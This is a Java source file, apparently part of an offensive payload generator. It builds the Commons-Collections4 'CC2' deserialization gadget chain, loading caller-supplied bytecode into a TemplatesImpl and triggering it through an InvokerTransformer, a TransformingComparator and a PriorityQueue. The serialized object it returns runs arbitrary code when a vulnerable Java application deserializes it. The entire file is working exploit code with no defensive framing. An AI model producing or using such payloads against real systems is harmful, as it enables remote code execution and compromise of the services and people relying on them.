package cn.safe6.payload.shortPayload.payload;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.PriorityQueue;

public class CC2 extends Payload {
    @SuppressWarnings("all")
    public static byte[] getPayloadUseByteCodes(byte[] byteCodes) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{byteCodes});
            setFieldValue(templates, "_name", "t");
            InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",
                    new Class[]{}, new Object[]{});
            TransformingComparator comparator = new TransformingComparator(invokerTransformer);
            PriorityQueue priorityQueue = new PriorityQueue(2);
            priorityQueue.add(1);
            priorityQueue.add(1);
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);
            return serialize(priorityQueue);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
